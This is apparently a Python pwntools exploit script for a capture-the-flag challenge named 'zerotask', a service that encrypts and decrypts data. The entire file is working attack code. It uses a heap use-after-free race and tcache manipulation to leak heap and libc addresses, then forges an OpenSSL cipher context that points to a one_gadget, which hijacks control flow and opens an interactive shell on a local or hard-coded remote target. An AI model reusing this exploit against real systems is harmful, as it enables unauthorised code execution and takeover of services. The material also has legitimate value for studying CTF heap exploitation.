from pwn import *
from time import sleep
debug=1
# context.log_level='debug'

def ru(x):
    return p.recvuntil(x)
    
def se(x):
    p.send(x)

def sl(x):
    p.sendline(x)

ru = lambda x : p.recvuntil(x)
se = lambda x : p.send(x)

sla = lambda question , answer : p.sendlineafter(question , answer)
sa = lambda question , answer : p.sendafter(question , answer)
cmd = lambda c : p.sendlineafter("Choice:" , str(c))
def add(id,type,key,iv,sz,data):
    cmd(1)
    sla('Task id : ' , str(id))
    sla('Encrypt(1) / Decrypt(2): ' , str(type))
    sa('Key : ' , key)
    sa('IV : ' , iv)
    sla('Data Size : ',str(sz))
    sa('Data : ',data)    

def add_fast(id,type,key,iv,sz, data , delay=0):
    ru('Choice: ')
    se('1\n'+str(id)+'\n'+str(type)+'\n'+key+iv+str(sz)+'\n')
    if delay != 0:
        sleep(delay)
    se(data)
    

def add_check(id,type,key,iv,sz,data):
    cmd(1)
    sla('Task id : ' , str(id))
    sla('Encrypt(1) / Decrypt(2): ' , str(type))
    sa('Key : ' , key)
    sa('IV : ' , iv)
    gdb.attach(p , "b malloc")
    sla('Data Size : ',str(sz))
    sa('Data : ',data)    

def delete(id):
    cmd(2)
    sla('Task id : ',str(id))

def go(id):
    cmd(3)
    sla('Task id : ',str(id))

def dec(sz,data):
    w = process('./dec')
    w.send(p32(sz)+data)
    t = u32(w.recv(4))
    data = w.recv(t)
    w.close() 
    return data

def get_data():
    ru('Ciphertext: \n')
    tmp = ''
    for i in range(5):
        t = ru('\n')[:-2].split(' ')
        for q in t:
            tmp+=chr(int(q,16))
    return tmp

if debug:
    p=process('./zerotask' )
else:
    p=remote('111.186.63.201', 10001)
add = add_fast
# leak heap
for i in range(3):
    add(i,1,'a'*32,'b'*16,0x70,'t'*0x70)

# 0x80 # 0xb0 # 0x110 # 0x80 # 0
# 1
# 2


for i in range(2):
    delete(i)

for i in range(2):
    add(i,1,'a'*32,'b'*16,0x40,'t'*0x40)
go(1)
 
delete(1) # controller chunk delete in tcache last

# fake a ctx 
add(8 , 1 , "a" * 32 , "b" * 16 , 0x70 , "t" * 0x70 , delay = 3)

tmp = get_data()
heap = u64(dec(len(tmp),tmp)[:8]) - 0x14c0
log.info("heap:" + hex(heap))
# tcachebins 
    # 0x40 1
    # 0x70 1 -> leaked
# se('a'*0x70)
# leak libc
add(5,1,'a'*32,'b'*16,0x40,'a'*0x40)
# clear bins

for i in range(9):
    add(i+10,1,'a'*32,'b'*16,0x90,'a'*0x90)

# fill tcache
for i in range(7):
    delete(i+10)
# gdb.attach(p)
go(18)
delete(18) # to unsorted bin
# clear tcache
for i in range(7):
    add(i+10,1,'a'*32,'b'*16,0x90,'a'*0x90)

add(17 , 1 , "a" * 32 , "b" * 16 , 0x40 , "t" * 0x40 , delay = 3)

# ru('Ciphertext: \n')

tmp = get_data()
libc = u64(dec(len(tmp),tmp)[:8])
base = libc - 0x3ebc40 - 0x60
log.info("libc : " + hex(base))
# end
# heap fengshui?
fake = heap + 0x3b80 # data_ptr_chunk addr
log.info("------------->" + hex(fake + 8))
# fake ctx chunk
# target_expolit in function EVP_CipherUpdate
# v5 = *ctx
# if(*(_BYTE *)(v5 + 0x12) & 0x10):
#   (v5 + 0x20))(ctx, a2, 0LL, 0LL)
tmp = p64(fake+8) # 
tmp += p64(0x00000010000001ab)+p64(0x0000001000000020)
tmp += p64(0x0000000000001002)+p64(0x0) # 0x0000000000001002 for | if(*(_BYTE *)(v5 + 0x12) & 0x10):
tmp += p64(base+0x10a38c)  # one_gadget 
tmp = tmp.ljust(0x90,'\x00')

#
# gdb.attach(p , "b malloc\nc\n") 
add(30,1,'a'*32,'b'*16,0x90,tmp)

for i in range(4):
    add(i+31,1,'a'*32,'b'*16,0x70,'a'*0x70)

delete(31)  
delete(32)
num = 0x90

add(31,1,'a'*32,'b'*16,num,'a'*num)
# 0xa0 -> 1 
# 0x100 -> 1
# small bin 0x50  -> 0
# 0x80 -> 3
add(32,1,'a'*32,'b'*16,0x70,'a'*0x70)
# 0x80 -> 1
# 0xa0 -> 0
# 0x100 -> 0

go(32)
delete(32)
delete(31) 
# free 0x110   # 0x110 -> 1 # 0x110 -> 2
# free 0xb0   # 0xb0 - > 1 # 0xb0 -> 2
# free data_ptr # 0x80 -> 2 # 0x40 -> 1
# free controller # 0x80 - > 3 # 0x80 - > 4
# pause()
exp = 'd'*88+p64(fake) # 0x58 # controller ctx_pointer  
exp = exp.ljust(0x70,'e')

add(31,1,'a'*32,'b'*16,0x70,exp , 1.5) # data_ptr is 32's controller chunk
# malloc 0x80 # 31's controller
# 0xa0    # 31's
# 0x100   # 31's
# 0x80    # 32's  controller

ru("Choice:")
p.interactive()   